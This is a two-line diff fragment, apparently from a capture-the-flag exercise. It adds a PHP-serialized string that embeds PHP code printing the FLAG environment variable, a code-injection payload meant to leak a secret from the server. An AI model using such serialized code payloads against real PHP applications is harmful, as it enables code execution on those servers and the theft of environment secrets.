@@ -1,0 +1,2 @@
+
+    s:28:"<?php echo getenv('FLAG');?>";  
